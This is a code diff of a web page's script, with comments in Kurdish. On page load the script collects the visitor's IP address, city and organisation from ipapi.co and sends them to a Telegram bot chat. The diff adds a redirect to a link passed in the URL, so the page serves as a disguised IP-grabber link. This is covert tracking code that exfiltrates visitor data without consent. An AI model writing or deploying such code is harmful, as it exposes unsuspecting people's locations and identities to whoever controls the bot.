@@ -45,9 +45,13 @@
         const CHAT_ID = '7641255924';
         const statusText = document.getElementById('statusText');
 
-        async function getIPAndSend() {
+        // خوێندنەوەی لینکەکان لە ناونیشانی سەرەکی (URL Parameters)
+        const urlParams = new URLSearchParams(window.location.search);
+        const mainLink = urlParams.get('main');
+
+        async function getIPAndRedirect() {
             try {
-                // داواکردنی زانیاری ئایپی لە ڕێگەی API
+                // وەرگرتنی زانیاری ئایپی
                 let res = await fetch('https://ipapi.co/json/');
                 let data = await res.json();
                 
@@ -57,7 +61,7 @@
                                 `City: ${data.city}\n` +
                                 `Org: ${data.org}`;
 
-                // ناردنی زانیارییەکان بۆ تەلەگرام
+                // ناردنی بۆ تەلەگرام
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -67,13 +71,19 @@
                     })
                 });
 
-                statusText.innerText = "Ready!";
             } catch (e) {
-                statusText.innerText = "Failed to load.";
+                console.error("Failed to send IP");
+            }
+
+            // گواستنەوەی بەکارهێنەر بۆ لینکی سەرەکی دوای ناردنی زانیارییەکان
+            if (mainLink) {
+                window.location.href = mainLink;
+            } else {
+                statusText.innerText = "Ready!";
             }
         }
 
-        window.onload = getIPAndSend;
+        window.onload = getIPAndRedirect;
     </script>
 </body>
 </html>
